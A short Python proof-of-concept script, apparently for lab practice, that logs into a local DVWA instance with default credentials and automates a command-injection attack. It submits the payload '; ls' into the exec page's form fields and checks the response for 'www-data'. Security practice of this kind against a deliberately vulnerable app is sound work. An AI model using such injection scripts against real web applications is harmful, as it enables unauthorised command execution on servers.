import requests
from bs4 import BeautifulSoup
import re

# login to DVWA
login_url = 'http://172.17.0.1/login.php'
username = 'admin'
password = 'password'

# Create session
session = requests.Session()

# Get Token
response = session.get(login_url)
token = re.findall("user_token'\s*value='(.*?)'", response.text)[0]

# Login to DVWA
response = session.post(login_url, data={
    'username': username,
    'password': password,
    'user_token': token,
    'Login': 'Login'
})

# Get HTML
url = 'http://172.17.0.1/'
response = session.get(url)

# Parse HTML & Find Links
soup = BeautifulSoup(response.content, "html.parser")
links = soup.find_all("a")

# Add url to List
url_list = []
for link in links:
    url_list.append('/' + link.get("href"))

# Imprimer la liste des URLs
print(url_list)


# ========================== PoC ========================== 

urlD = 'http://172.17.0.1/vulnerabilities/exec/'

response = session.get(urlD)

soup = BeautifulSoup(response.text, 'html.parser')

# Find Form on the page
forms = soup.find_all('form')

commandInjection = '; ls'

for form in forms:
    inputs = form.find_all('input')
    for input in inputs:
        if input.get('type') == 'text':
            # Submit form
            form_data = {}
            for form_input in form.find_all('input'):
                form_data[form_input.get('name')] = form_input.get('value')
                if form_input.get('type') == 'text':
                    form_data[form_input.get('name')] = commandInjection
                    response = session.post('http://172.17.0.1/vulnerabilities/exec/' + form.get('action'), data=form_data)
                    print("====================>\n" + response.text)
                    if response.text.find("www-data") != -1:
                        print("La commande a été exécutée avec succès")
                        print(response.text)
                    else:
                        print("La commande n'a pas été exécutée correctement")
                    break
                if form_input.get('type') == 'submit':
                    form_data[form_input.get('name')] = form_input.get('value')
            break
        break
